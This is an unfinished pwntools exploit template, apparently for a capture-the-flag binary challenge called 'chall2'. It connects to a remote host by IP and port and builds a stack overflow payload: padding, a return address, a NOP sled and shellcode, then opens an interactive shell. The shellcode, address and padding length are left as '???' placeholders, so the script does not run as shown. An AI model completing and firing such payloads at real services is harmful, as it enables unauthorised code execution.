#!/usr/bin/env python3
from pwn import *

# decode the binary
e = context.binary = ELF('./chall2', checksec=False)
context.terminal = ['terminator', '-e']

# io = process(e.path)
io = remote('209.126.8.12', 1338)

# exploit
shellcode = asm(
    ???
)
shellcode_addr = ???

def pwn():
    payload = ???*b'A'
    payload += shellcode_addr
    payload += 256*b'\x90'
    payload += shellcode
    
    gdb.attach(io)
    io.sendlineafter('plz\n', payload)

pwn()
io.interactive()